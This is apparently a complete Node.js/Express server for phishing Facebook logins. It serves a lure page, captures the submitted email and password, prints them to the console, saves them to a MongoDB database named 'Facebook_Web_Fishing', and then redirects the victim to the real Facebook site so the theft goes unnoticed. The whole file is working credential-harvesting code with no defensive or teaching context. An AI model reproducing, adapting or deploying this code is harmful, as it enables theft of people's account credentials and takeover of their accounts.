const express = require('express')
const bodyParser = require('body-parser')
const mongoose = require('mongoose')
const fs = require('fs')
const schema = mongoose.Schema;
const app  = express();

app.use(bodyParser.urlencoded({
    extended : true
}))

mongoose.connect("mongodb://localhost/Facebook_Web_Fishing", function (err) {
    if(err){
        console.error('DB Error!')
    }
    else {
        console.log('DB Connect Success')
    }
})

var UserSchema = new schema({
    email : {
        type : String
    },
    password : {
        type : String
    }

})

var User = mongoose.model('user', UserSchema)

app.listen(3000, function (err) {
    if(err){
        console.error('Server Error!')
        throw err
    }
    else {
        console.log('Server Running At 3000 Port!')
    }
})

app.get('/', function (req, res) {
    fs.readFile('asdf.html', 'utf-8', function (err, data) {
        res.send(data)
    })
})

app.post('/', function (req, res) {
    var body = req.body;
    var user = new User({
        email : body.email,
        password : body.pass
    })
    console.log('EMAIL : '+body.email)
    console.log('Password : '+body.pass)
    User.findOne({
        email : body.email
    }, function (err, result) {
        if(err){
            console.log('/ Error!')
            throw err
        }
        else if(result) {
            res.redirect('https://www.facebook.com/');
        }
        else {
            user.save(function (err) {
                if (err) {
                    console.log("save Error")
                    throw err
                }
                else {
                    res.redirect('https://www.facebook.com/')
                }
            })
        }
    })

})